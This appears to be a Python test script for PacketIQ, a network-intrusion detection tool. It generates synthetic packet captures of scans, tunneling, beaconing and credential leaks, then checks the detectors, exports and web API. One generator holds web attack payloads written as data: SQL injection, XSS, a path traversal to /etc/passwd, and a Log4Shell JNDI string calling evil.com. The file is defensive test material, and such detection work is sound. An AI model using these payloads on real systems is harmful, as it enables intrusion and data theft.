#!/usr/bin/env python3
"""
PacketIQ — publishing-level sandbox test campaign.

Generates realistic attack + benign captures with scapy (real packets, no fake
data) and exercises every layer of PacketIQ: detectors, correlation, risk,
triage/explainability, exports, the full web API, and edge cases. Writes a
structured JSON results file used to render the PDF test report.
"""
from __future__ import annotations

import json
import os
import platform
import sys
import time
import warnings
from datetime import datetime, timezone

warnings.filterwarnings("ignore")

from scapy.all import ICMP, IP, TCP, UDP, DNS, DNSQR, Ether, Raw, wrpcap  # noqa: E402
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse  # noqa: E402

SANDBOX = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(SANDBOX))   # repo root (docs/sandbox_test → repo)
PCAP_DIR = os.path.join(SANDBOX, "pcaps")
os.makedirs(PCAP_DIR, exist_ok=True)

RESULTS: dict = {
    "meta": {
        "generated": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
        "platform": platform.platform(),
        "python": platform.python_version(),
    },
    "categories": [],
}


def _cat(name):
    c = {"name": name, "cases": []}
    RESULTS["categories"].append(c)
    return c


def record(cat, name, ok, detail=""):
    cat["cases"].append({"name": name, "status": "PASS" if ok else "FAIL", "detail": str(detail)})
    flag = "PASS" if ok else "FAIL"
    print(f"  [{flag}] {name} — {detail}")
    return ok


T0 = 1700000000.0
# Genuinely public (internet-routable) IPs for "external attacker / C2" scenarios.
# (203.0.113.x / 198.51.100.x are RFC 5737 documentation ranges that ipaddress
#  classifies as non-public, so they must NOT be used as external endpoints.)
ATTACKER_PUB = "91.240.118.20"
C2_PUB = "185.220.101.50"


# ── scenario PCAP generators (real packets) ──────────────────────────────────

def gen_brute_force():
    pkts = []
    for i in range(40):
        p = Ether() / IP(src="203.0.113.9", dst="192.168.1.10") / TCP(sport=40000 + i, dport=22, flags="S")
        p.time = T0 + i * 0.5
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "brute_force.pcap"); wrpcap(path, pkts); return path


def gen_port_scan():
    pkts = []
    for i, port in enumerate(range(20, 70)):
        p = Ether() / IP(src="203.0.113.9", dst="192.168.1.10") / TCP(sport=50000 + i, dport=port, flags="S")
        p.time = T0 + i * 0.05
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "port_scan.pcap"); wrpcap(path, pkts); return path


def gen_host_scan():
    pkts = []
    for i in range(40):
        p = Ether() / IP(src="203.0.113.9", dst=f"192.168.1.{i+1}") / TCP(sport=50000 + i, dport=445, flags="S")
        p.time = T0 + i * 0.05
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "host_scan.pcap"); wrpcap(path, pkts); return path


def gen_dns_tunnel():
    pkts = []
    for i in range(30):
        label = ("a1b2c3d4e5f6g7h8" * 4)[:60]  # long, high-entropy-ish label
        q = (Ether() / IP(src="192.168.1.20", dst="8.8.8.8") / UDP(sport=55000 + i, dport=53)
             / DNS(rd=1, qd=DNSQR(qname=f"{label}{i}.exfil.example")))
        q.time = T0 + i * 0.5
        pkts.append(q)
    path = os.path.join(PCAP_DIR, "dns_tunnel.pcap"); wrpcap(path, pkts); return path


def gen_beacon():
    pkts = []
    t = T0
    for i in range(30):                       # fixed 30s cadence to one external C2, new port each check-in
        sp = 44000 + i
        for fl, dt in (("S", 0.0), ("SA", 0.05), ("A", 0.08), ("PA", 0.1), ("FA", 0.2)):
            src, dst, s, dd = ("192.168.1.30", C2_PUB, sp, 443) if fl != "SA" else (C2_PUB, "192.168.1.30", 443, sp)
            p = Ether() / IP(src=src, dst=dst) / TCP(sport=s, dport=dd, flags=fl) / (b"x" * 60)
            p.time = t + dt
            pkts.append(p)
        t += 30.0
    path = os.path.join(PCAP_DIR, "beacon.pcap"); wrpcap(path, pkts); return path


def gen_icmp_tunnel():
    pkts = []
    for i in range(120):                      # bulk data over ICMP (> 100 KB)
        p = Ether() / IP(src="192.168.1.40", dst="198.51.100.30") / ICMP() / (b"D" * 1000)
        p.time = T0 + i * 0.1
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "icmp_tunnel.pcap"); wrpcap(path, pkts); return path


def gen_http_attack():
    pkts = []
    attacks = ["/index.php?id=1' OR '1'='1", "/search?q=<script>alert(1)</script>",
               "/../../../../etc/passwd", "/?x=${jndi:ldap://evil.com/a}"]
    for i, uri in enumerate(attacks):
        p = (Ether() / IP(src="203.0.113.50", dst="192.168.1.10") / TCP(sport=33000 + i, dport=80, flags="PA")
             / HTTP() / HTTPRequest(Method=b"GET", Host=b"victim.local", Path=uri.encode(), User_Agent=b"sqlmap/1.5"))
        p.time = T0 + i
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "http_attack.pcap"); wrpcap(path, pkts); return path


def gen_cleartext_creds():
    pkts = []
    # FTP USER/PASS in cleartext
    for i, payload in enumerate([b"USER admin\r\n", b"PASS S3cret!\r\n"]):
        p = Ether() / IP(src="192.168.1.60", dst="203.0.113.70") / TCP(sport=34000, dport=21, flags="PA") / Raw(payload)
        p.time = T0 + i
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "cleartext_creds.pcap"); wrpcap(path, pkts); return path


def gen_suspicious_flags():
    pkts = []
    for i in range(20):
        xmas = Ether() / IP(src="203.0.113.9", dst="192.168.1.10") / TCP(sport=35000 + i, dport=80, flags="FPU")
        xmas.time = T0 + i * 0.1
        pkts.append(xmas)
    path = os.path.join(PCAP_DIR, "suspicious_flags.pcap"); wrpcap(path, pkts); return path


def gen_ioc_match(feodo_ip):
    pkts = []
    for i in range(10):
        p = Ether() / IP(src="192.168.1.80", dst=feodo_ip) / TCP(sport=36000 + i, dport=443, flags="PA") / (b"x" * 80)
        p.time = T0 + i
        pkts.append(p)
    path = os.path.join(PCAP_DIR, "ioc_match.pcap"); wrpcap(path, pkts); return path


def gen_smb_internet():
    pkts = []
    for i in range(8):
        sp = 37000 + i
        for fl in ("S", "SA", "A", "PA"):
            src, dst, s, dd = (ATTACKER_PUB, "192.168.1.10", sp, 445) if fl != "SA" else ("192.168.1.10", ATTACKER_PUB, 445, sp)
            p = Ether() / IP(src=src, dst=dst) / TCP(sport=s, dport=dd, flags=fl) / (b"\x00" * 100)
            p.time = T0 + i
            pkts.append(p)
    path = os.path.join(PCAP_DIR, "smb_internet.pcap"); wrpcap(path, pkts); return path


def gen_multi(feodo_ip):
    """A realistic multi-stage intrusion: scan → exploit → C2/IOC → exfil — so the
    report, SIGMA, STIX, Navigator and chains all have rich, real content."""
    from scapy.all import rdpcap
    paths = [gen_port_scan(), gen_brute_force(), gen_http_attack(), gen_ioc_match(feodo_ip), gen_cleartext_creds()]
    pkts = []
    base = T0
    for p in paths:
        for pk in rdpcap(p):
            pkts.append(pk)
    pkts.sort(key=lambda x: float(x.time))
    out = os.path.join(PCAP_DIR, "multi_attack.pcap"); wrpcap(out, pkts); return out


def gen_benign():
    pkts = []
    t = T0
    for i in range(60):
        sport = 40000 + i
        for fl, payload in (("S", b""), ("SA", b""), ("A", b""), ("PA", b"x" * 400)):
            src, dst = ("192.168.1.20", "142.250.190.78") if fl != "SA" else ("142.250.190.78", "192.168.1.20")
            sp, dp = (sport, 443) if fl != "SA" else (443, sport)
            p = Ether() / IP(src=src, dst=dst) / TCP(sport=sp, dport=dp, flags=fl) / Raw(payload)
            p.time = t; t += 0.05
        t += 1.0
    for d in ["google.com", "github.com", "cloudflare.com", "wikipedia.org", "apple.com"]:
        q = Ether() / IP(src="192.168.1.20", dst="8.8.8.8") / UDP(sport=55000, dport=53) / DNS(rd=1, qd=DNSQR(qname=d))
        q.time = t; t += 3.0
        pkts.append(q)
    path = os.path.join(PCAP_DIR, "benign.pcap"); wrpcap(path, pkts); return path


# ── analysis helper ──────────────────────────────────────────────────────────

def analyze(path):
    from packetiq.parser.pcap_parser import PCAPParser
    from packetiq.extractor.data_extractor import DataExtractor
    from packetiq.detection.engine import DetectionEngine
    ex = DataExtractor()
    for rec in PCAPParser(path).stream():
        ex.feed(rec)
    res = ex.finalize()
    events, risk, fps = DetectionEngine().run(res, path)
    return res, events, risk


def main():
    from packetiq.enrichment.feeds import load_store
    store = load_store()
    feodo = next((ip for ip, h in store.bad_ips.items() if h.source == "Feodo Tracker"), "162.243.103.246")
    RESULTS["meta"]["ioc_ip_used"] = feodo

    # ── 1. Detection accuracy (true positives) ──
    cat = _cat("Detection accuracy (true positives)")
    scenarios = [
        ("Brute force (SSH)", gen_brute_force, {"BRUTE_FORCE"}),
        ("Port scan (vertical)", gen_port_scan, {"PORT_SCAN"}),
        ("Host scan (horizontal)", gen_host_scan, {"HOST_SCAN"}),
        ("DNS tunneling", gen_dns_tunnel, {"DNS_TUNNELING", "DNS_ANOMALY"}),
        ("C2 beaconing", gen_beacon, {"C2_BEACON"}),
        ("ICMP tunneling", gen_icmp_tunnel, {"ICMP_TUNNELING"}),
        ("HTTP exploitation", gen_http_attack, {"HTTP_ATTACK"}),
        ("Cleartext credentials", gen_cleartext_creds, {"CREDENTIAL_EXPOSURE"}),
        ("Suspicious TCP flags (XMAS)", gen_suspicious_flags, {"SUSPICIOUS_FLAGS"}),
        ("Threat-intel IOC match", lambda: gen_ioc_match(feodo), {"IOC_MATCH"}),
        ("SMB to/from internet", gen_smb_internet, {"PROTOCOL_MISUSE"}),
    ]
    detection_evidence = {}
    for name, gen, expect in scenarios:
        try:
            path = gen()
            _res, events, risk = analyze(path)
            types = {e.event_type.value for e in events}
            hit = bool(expect & types)
            detection_evidence[name] = {"expected": sorted(expect), "fired": sorted(types),
                                        "events": len(events), "risk": risk.score}
            record(cat, name, hit, f"expected {sorted(expect)} → fired {sorted(types)} ({len(events)} events, risk {risk.score})")
        except Exception as e:
            record(cat, name, False, f"ERROR: {e}")

    # ── 2. False-positive control (benign must stay clean) ──
    cat = _cat("False-positive control")
    try:
        path = gen_benign()
        _res, events, risk = analyze(path)
        ok = len(events) == 0 and risk.score == 0
        detection_evidence["Benign control"] = {"events": len(events), "risk": risk.score}
        record(cat, "Benign HTTPS+DNS produces zero findings", ok, f"{len(events)} findings, risk {risk.score}/100")
    except Exception as e:
        record(cat, "Benign control", False, f"ERROR: {e}")
    RESULTS["detection_evidence"] = detection_evidence

    # ── 3. Triage / explainability / suppression ──
    cat = _cat("Triage, explainability & FP suppression")
    try:
        from packetiq import triage
        from packetiq.detection.models import DetectionEvent, EventType, Severity
        ioc = DetectionEvent(EventType.IOC_MATCH, Severity.CRITICAL, "192.168.1.80", "x",
                             dst_ip=feodo, confidence=1.0, evidence={"indicator": feodo, "source": "Feodo Tracker"})
        ex = triage.explain(ioc)
        record(cat, "Explain returns grounded what/why/action + MITRE", bool(ex["why"] and ex["recommendation"] and ex["mitre"]),
               f"precision={ex['precision']}, mitre={[m['id'] for m in ex['mitre']]}")
        record(cat, "Evidence-backed finding graded 'Confirmed'", ex["precision"] == "Confirmed", ex["precision"])
        scan = DetectionEvent(EventType.PORT_SCAN, Severity.HIGH, "10.0.0.1", "x", dst_ip="10.0.0.2", confidence=0.4)
        record(cat, "Low-confidence heuristic graded 'Tentative'", triage.precision(scan) == "Tentative", triage.precision(scan))
        kept, supp = triage.apply_suppression([ioc, scan])
        record(cat, "Default config suppresses nothing (recall preserved)", len(kept) == 2 and not supp, f"kept {len(kept)}")
        kept2, supp2 = triage.apply_suppression([ioc, scan], min_confidence=0.5)
        record(cat, "Confidence floor suppresses low-confidence finding", len(kept2) == 1 and len(supp2) == 1, supp2[0][1] if supp2 else "")
    except Exception as e:
        record(cat, "Triage", False, f"ERROR: {e}")

    # ── 4. Exports ──
    cat = _cat("Exports (real artifacts)")
    try:
        path = gen_multi(feodo)
        from packetiq.correlation.engine import CorrelationEngine
        res, events, risk = analyze(path)
        chains = CorrelationEngine().correlate(events)
        from packetiq.export import build_html, build_navigator_layer, to_stix_bundle
        from packetiq.sigma.generator import SigmaGenerator
        html = build_html({"filename": "multi_attack.pcap"}, res, events, chains, risk, pcap_sha256="a" * 64)
        record(cat, "Court-ready HTML report (custody + ATT&CK + reasoning + print CSS)",
               all(m in html for m in ("Chain of custody", "MITRE ATT&CK coverage", "Finding analysis", "@media print")),
               f"{len(html)} bytes")
        nav = build_navigator_layer(events)
        record(cat, "ATT&CK Navigator layer (enterprise-attack, format 4.5)",
               nav["domain"] == "enterprise-attack" and nav["versions"]["layer"] == "4.5" and bool(nav["techniques"]),
               f"{len(nav['techniques'])} techniques")
        stix = to_stix_bundle(events, chains)
        record(cat, "STIX 2.1 bundle", stix.get("type") == "bundle" and bool(stix.get("objects")), f"{len(stix.get('objects', []))} objects")
        rules = SigmaGenerator().generate(events, chains)
        record(cat, "SIGMA rules generated", isinstance(rules, list) and len(rules) > 0, f"{len(rules)} rules")
    except Exception as e:
        record(cat, "Exports", False, f"ERROR: {e}")

    # ── 5. Vulnerability mapping (NVD CPE + CVSS + CISA KEV) ──
    cat = _cat("Vulnerability mapping (NVD CPE · CVSS · CISA KEV)")
    try:
        from packetiq.enrichment import kev, nvd
        # mock NVD network only; KEV logic exercised with real structure
        nvd.get_api_key = lambda: "test"
        nvd.resolve_cpe = lambda product, version, **k: f"cpe:2.3:a:apache:http_server:{version}:*:*:*:*:*:*:*"
        nvd._cves_by_cpe = lambda client, cpe, **k: [
            {"id": "CVE-2021-41773", "cvss": 9.8, "severity": "CRITICAL", "published": "2021-10-05", "description": "x", "url": "u"},
            {"id": "CVE-2000-0001", "cvss": 2.6, "severity": "LOW", "published": "2000-01-01", "description": "y", "url": "u2"}]
        kev.kev_info = lambda cid: {"ransomware": True} if cid == "CVE-2021-41773" else None
        kev.is_kev = lambda cid: cid in {"CVE-2021-44228", "CVE-2021-41773"}
        kev.count = lambda: 1621
        bn = [{"source": "http-server", "value": "Apache/2.4.49 (Unix)", "ips": ["192.168.1.10"]}]
        atk = [{"attack_type": "Log4Shell / JNDI", "dst_ip": "192.168.1.10"}]
        va = nvd.assess_vulnerabilities(bn, atk)
        p = va["products"][0]
        record(cat, "Observed software resolved to an exact CPE", p["cpe"].endswith("2.4.49:*:*:*:*:*:*:*"), p["cpe"])
        record(cat, "Version-aware NVD CVE mapping", any(c["id"] == "CVE-2021-41773" for c in p["cves"]), f"{len(p['cves'])} CVEs")
        record(cat, "CISA KEV cross-reference flags actively-exploited CVEs", p["cves"][0]["kev"] is True and p["cves"][0]["ransomware"] is True, "KEV+ransomware on top CVE")
        record(cat, "CVSS fused into a vulnerability risk score", va["risk"]["score"] >= 90 and va["risk"]["tier"] == "CRITICAL", f"{va['risk']}")
        record(cat, "Exploit attempt correlated to CVE + target software", bool(va["correlations"]) and va["correlations"][0]["target_software"] == ["Apache 2.4.49"], "Log4Shell→target")
        record(cat, "Per-host attack-surface roll-up", va["hosts"][0]["ip"] == "192.168.1.10", f"host {va['hosts'][0]['ip']}")
    except Exception as e:
        record(cat, "Vulnerability mapping", False, f"ERROR: {e}")

    # ── 6. Web API (end-to-end via TestClient) ──
    cat = _cat("Web API (end-to-end)")
    try:
        import tempfile
        os.environ["PACKETIQ_DB"] = os.path.join(tempfile.gettempdir(), "piq_sandbox.db")
        # mock the AI + NVD network calls so the API tests are deterministic and offline
        from packetiq.webapp import app as appmod
        from packetiq.enrichment import nvd as nvdmod

        async def _fake_collect(system, context, messages):
            return "This packet is a TCP segment to a known-bad host; treat the internal host as suspect."
        appmod._collect_ai_with_fallback = _fake_collect
        appmod._detect_provider = lambda skip=None: {"provider": "groq", "key": "x", "model": "m"}
        nvdmod.lookup_banners = lambda banners, *a, **k: {"available": True, "queried": [], "results": [],
                                                          "note": "mocked", "error": None}
        nvdmod.assess_vulnerabilities = lambda banners, attacks, *a, **k: {
            "available": True, "products": [], "hosts": [], "correlations": [],
            "risk": {"score": 0, "tier": "NONE"},
            "totals": {"cves": 0, "kev": 0, "products": 0, "kev_catalog": 1621},
            "note": "mocked", "error": None}
        from fastapi.testclient import TestClient
        # NOTE: the `with` context manager starts the app event loop so the
        # background analysis task actually runs (required for result endpoints).
        with TestClient(appmod.create_app()) as client:
            with open(gen_multi(feodo), "rb") as f:
                job = client.post("/api/upload", files={"file": ("multi_attack.pcap", f, "application/octet-stream")}).json()["job_id"]
            for _ in range(120):
                if client.get(f"/api/results/{job}").status_code == 200:
                    break
                time.sleep(0.25)
            res = client.get(f"/api/results/{job}").json()
            record(cat, "POST /api/upload → analysis completes", bool(res.get("events") is not None),
                   f"{len(res.get('events', []))} events, risk {res.get('risk', {}).get('score')}")
            record(cat, "Results include explainability + ATT&CK coverage + custody SHA-256",
                   "attack_coverage" in res and len(res["meta"].get("sha256", "")) == 64 and
                   (not res["events"] or "why" in res["events"][0]), "meta.sha256 + events[].why present")
            ep = lambda m, u: getattr(client, m)(u).status_code
            for label, code in [
                ("GET /api/packets/{job}", ep("get", f"/api/packets/{job}")),
                ("GET /api/packets/{job}/0", ep("get", f"/api/packets/{job}/0")),
                ("POST /api/packets/{job}/0/explain (AI)", client.post(f"/api/packets/{job}/0/explain").status_code),
                ("GET /api/cve/{job}", ep("get", f"/api/cve/{job}")),
                ("GET /api/vulns/{job} (NVD CPE+CVSS+KEV)", ep("get", f"/api/vulns/{job}")),
                ("GET /api/navigator/{job}", ep("get", f"/api/navigator/{job}")),
                ("GET /api/report/{job}.html", ep("get", f"/api/report/{job}.html")),
                ("GET /api/report/{job}.html?print=1", client.get(f"/api/report/{job}.html", params={"print": 1}).status_code),
                ("GET /api/stix/{job}", ep("get", f"/api/stix/{job}")),
                ("GET /api/sigma/{job}/rules.zip", ep("get", f"/api/sigma/{job}/rules.zip")),
                ("GET /api/feeds", ep("get", "/api/feeds")),
                ("GET /api/ai/status", ep("get", "/api/ai/status")),
                ("GET /api/live/interfaces", ep("get", "/api/live/interfaces")),
                ("GET /api/history", ep("get", "/api/history")),
            ]:
                record(cat, label, code == 200, f"HTTP {code}")
            record(cat, "Dynamic per-PCAP threat-intel matches (synced to this capture)",
                   any(m.get("source") == "Feodo Tracker" for m in res.get("threat_intel_matches", [])),
                   f"{len(res.get('threat_intel_matches', []))} feed(s) matched this capture")
            sw = client.post("/api/ai/provider", json={"provider": "groq"})
            record(cat, "POST /api/ai/provider (auto-switch control)", sw.status_code == 200, f"HTTP {sw.status_code}")
            evp = client.get(f"/api/evidence/{job}", params={"ip": feodo})
            record(cat, "GET /api/evidence/{job} (carve evidence PCAP)", evp.status_code == 200 and len(evp.content) > 24,
                   f"{len(evp.content)} bytes")
    except Exception as e:
        import traceback
        record(cat, "Web API", False, f"ERROR: {e} | {traceback.format_exc()[-200:]}")

    # ── 6. Alternative inputs & campaign ──
    cat = _cat("Alternative inputs & campaign")
    try:
        import tempfile
        conn = ("#separator \\x09\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\t"
                "duration\torig_bytes\tresp_bytes\tconn_state\n"
                "1700000000.0\tC1\t" + ATTACKER_PUB + "\t44321\t192.168.1.10\t445\ttcp\t-\t1.0\t5000\t200\tSF\n")
        zp = os.path.join(PCAP_DIR, "conn.log"); open(zp, "w").write(conn)
        from packetiq.inputs import load_conn_log
        zres = load_conn_log(zp)
        from packetiq.detection.engine import DetectionEngine
        zev, zrisk, _ = DetectionEngine().run(zres, zp)
        record(cat, "Zeek conn.log ingestion + detection", len(zev) >= 1, f"{len(zev)} events from flow log")
        # campaign fuse via merge
        from packetiq.parser.pcap_parser import PCAPParser
        from packetiq.extractor.data_extractor import DataExtractor
        results = []
        for p in (gen_brute_force(), gen_port_scan()):
            ex = DataExtractor()
            for rec in PCAPParser(p).stream():
                ex.feed(rec)
            results.append(ex.finalize())
        from packetiq.webapp.app import _merge_results
        merged = _merge_results(results)
        record(cat, "Campaign fuse merges multiple captures", merged.total_packets > 0,
               f"{merged.total_packets} packets merged from 2 captures")
    except Exception as e:
        record(cat, "Alternative inputs", False, f"ERROR: {e}")

    # ── 7. Edge cases & robustness ──
    cat = _cat("Edge cases & robustness")
    try:
        import tempfile
        from packetiq.webapp import app as appmod
        from fastapi.testclient import TestClient
        os.environ["PACKETIQ_DB"] = os.path.join(tempfile.gettempdir(), "piq_sandbox_edge.db")
        with TestClient(appmod.create_app()) as client:
            # tiny / invalid file
            r1 = client.post("/api/upload", files={"file": ("x.pcap", b"AB", "application/octet-stream")})
            record(cat, "Rejects too-small/invalid capture", r1.status_code >= 400, f"HTTP {r1.status_code}")
            # wrong extension
            r2 = client.post("/api/upload", files={"file": ("x.txt", b"hello world" * 5, "text/plain")})
            record(cat, "Rejects unsupported file type", r2.status_code >= 400, f"HTTP {r2.status_code}")
            # unknown job ids → 404
            record(cat, "Unknown job → 404 (results)", client.get("/api/results/nope").status_code == 404, "404")
            record(cat, "Unknown job → 404 (navigator)", client.get("/api/navigator/nope").status_code == 404, "404")
        # empty-capture analysis must not crash
        from scapy.all import wrpcap as _w
        ep = os.path.join(PCAP_DIR, "empty.pcap"); _w(ep, [])
        _res, events, risk = analyze(ep)
        record(cat, "Empty capture analysed without crash (0 findings)", len(events) == 0 and risk.score == 0,
               f"{len(events)} findings")
    except Exception as e:
        record(cat, "Edge cases", False, f"ERROR: {e}")

    # ── 8. Quality gates ──
    cat = _cat("Quality gates")
    import subprocess
    try:
        pt = subprocess.run([sys.executable, "-m", "pytest", "-p", "no:cacheprovider", "-q"],
                            cwd=ROOT, capture_output=True, text=True, timeout=600)
        last = [ln for ln in pt.stdout.splitlines() if "passed" in ln or "failed" in ln]
        record(cat, "Automated unit/integration test suite", pt.returncode == 0, last[-1] if last else "see output")
        RESULTS["meta"]["pytest_summary"] = last[-1] if last else ""
    except Exception as e:
        record(cat, "pytest", False, f"ERROR: {e}")
    try:
        rf = subprocess.run([sys.executable, "-m", "ruff", "check", "packetiq", "tests"],
                            cwd=ROOT, capture_output=True, text=True, timeout=120)
        record(cat, "Lint (ruff)", rf.returncode == 0, "All checks passed" if rf.returncode == 0 else rf.stdout[-120:])
    except Exception as e:
        record(cat, "ruff", False, f"ERROR: {e}")

    # ── totals ──
    total = sum(len(c["cases"]) for c in RESULTS["categories"])
    passed = sum(1 for c in RESULTS["categories"] for x in c["cases"] if x["status"] == "PASS")
    RESULTS["totals"] = {"total": total, "passed": passed, "failed": total - passed,
                         "pass_rate": round(100 * passed / total, 1) if total else 0}
    out = os.path.join(SANDBOX, "results.json")
    with open(out, "w") as f:
        json.dump(RESULTS, f, indent=2)
    print(f"\n=== TOTAL: {passed}/{total} passed ({RESULTS['totals']['pass_rate']}%) → {out} ===")
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
